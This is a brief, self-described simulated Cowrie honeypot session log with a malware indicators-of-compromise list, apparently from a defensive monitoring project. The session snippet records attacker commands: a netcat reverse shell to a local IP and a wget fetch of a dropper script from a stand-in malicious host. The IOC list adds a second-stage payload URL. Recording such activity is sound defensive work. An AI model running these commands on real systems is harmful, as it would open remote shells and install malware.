# 🐚 Cowrie Session Logs (Simulated)

## Session ID: 2025-05-17_03-42-01
**Source IP**: 172.16.0.54  
**Threat Tags**: `C2_REVERSE_SHELL_ATTEMPT`, `MALWARE_UPLOAD`  
**Transcript Snippet**:
```bash
nc -e /bin/sh 172.16.0.54 4444
wget http://evil.example.com/dropper.sh

Actions Taken:

Session logged in /opt/cowrie/logs/sessions/2025-05-17/03-42-01

Alert sent to:

kevinlandrycyber@gmail.com

Telegram Operator Bot

Threat Level: High


---

### 📁 `malware_IOCs.md`

```md
# 🧬 Malware Indicators of Compromise (IOCs)

## Sample: dropper.sh

- **SHA256**: `e99a18c428cb38d5f260853678922e03abd8335eabc6dca5f8057bc6c0d2dd52`
- **URL**: `http://evil.example.com/dropper.sh`
- **Filename**: `dropper.sh`
- **Observed Behavior**: Script attempts privilege escalation and second-stage payload fetch from `hxxp://malicious.example.biz/stage2.bin`
